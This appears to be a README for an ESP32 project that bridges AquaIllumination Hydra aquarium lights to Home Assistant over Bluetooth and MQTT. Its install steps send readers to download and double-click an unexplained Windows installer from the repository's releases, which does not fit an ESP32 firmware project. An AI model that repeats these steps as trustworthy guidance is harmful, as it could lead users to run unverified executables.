# 💡 hydrabridge-esp32 - Local control for your aquarium lights

[![Download Software](https://img.shields.io/badge/Download-hydrabridge-blue.svg)](https://github.com/Tubb6666/hydrabridge-esp32)

Hydrabridge-esp32 connects your AquaIllumination Hydra lights to your local home network. It acts as a bridge between the lights and your smart home setup. This system works without cloud accounts or internet dependency. It speaks the language of your lights using Bluetooth Low Energy and translates that data into formats your central home controller understands.

## 📋 What This Project Does

This software serves as a gateway. It allows your home automation system to monitor and adjust your aquarium lighting. It bridges the gap between different communication protocols. The bridge listens for data from your lights and sends updates to your dashboard. It also accepts commands from your dashboard to adjust brightness, color, or schedule.

It supports:
- Local light control without cloud servers.
- Integration with Home Assistant.
- Communication via MQTT protocols.
- RS485 and Modbus connections for industrial-grade stability.

## 🛠️ System Requirements

You need the following items to use this system:

- An ESP32 development board.
- A computer running Windows 10 or Windows 11.
- A USB cable compatible with your ESP32 board.
- An existing Wi-Fi network for your smart home devices.
- A Home Assistant instance if you want to use the automated dashboard features.

## 💾 How to Install

1. Visit this page to download the necessary files: [https://github.com/Tubb6666/hydrabridge-esp32](https://github.com/Tubb6666/hydrabridge-esp32).
2. Locate the releases section on that page.
3. Download the current installer package for Windows.
4. Save the file to your computer.
5. Open your downloads folder.
6. Double-click the file to start the installation process.
7. Follow the prompts on the screen to finish the setup.

## ⚙️ Configuration Steps

After the installation finishes, you must configure the device to talk to your lights.

1. Connect your ESP32 board to your computer using the USB cable.
2. Open the Hydrabridge application on your desktop.
3. Select the COM port that matches your connected ESP32 board.
4. Enter your Wi-Fi network name and password into the settings tab.
5. Input your MQTT broker details if you use one.
6. Click the Save button to store these settings on the device.
7. The device will restart and connect to your network.

## ⛓️ Connecting to Your Lights

The bridge uses Bluetooth to find your Hydra lights.

1. Open the Hydrabridge dashboard in your web browser.
2. Go to the Device Discovery tab.
3. Start the scan process.
4. The application will find nearby AquaIllumination lights.
5. Select your specific light from the list.
6. Bind the light to the bridge by following the pairing instructions on the screen.

## 🏠 Using with Home Assistant

This system integrates with Home Assistant for a unified view of your home.

1. Ensure your Home Assistant instance is running on the same network.
2. The Hydrabridge will broadcast its presence via MQTT.
3. Home Assistant will detect the new device automatically.
4. Add the device to your Lovelace dashboard to see lighting controls.
5. You can now create automations like sunrise and sunset effects without cloud latency.

## 🔧 Troubleshooting

If the system stops working, perform these checks:

- Check the status light on the ESP32 board. A solid green light indicates a network connection.
- Restart the Hydrabridge application if the dashboard does not load.
- Ensure the USB cable provides both power and data. Some cables only charge devices.
- Verify your Wi-Fi credentials in the settings menu.
- Move the ESP32 board closer to the aquarium lights if the Bluetooth signal strength appears weak.
- Clear your browser cache if the web interface displays outdated information.

## 🔒 Security and Privacy

This software runs locally on your network. It never sends your aquarium data to external clouds. Your light settings and schedules stay inside your home. This prevents third-party companies from tracking your habits or collecting data about your aquarium setup.

## 📜 License Information

This project uses an open-source license. You may view the source code, modify it for your specific needs, or share your improvements with the community. Refer to the license file in the repository for details on usage rights.

## 👥 Joining the Community

If you have questions or want to help improve the software, visit the GitHub repository. You can open an issue to report bugs or request features. Many users contribute to the documentation or help others with their hardware setups. Keep discussions helpful and focused on the technical aspects of the project.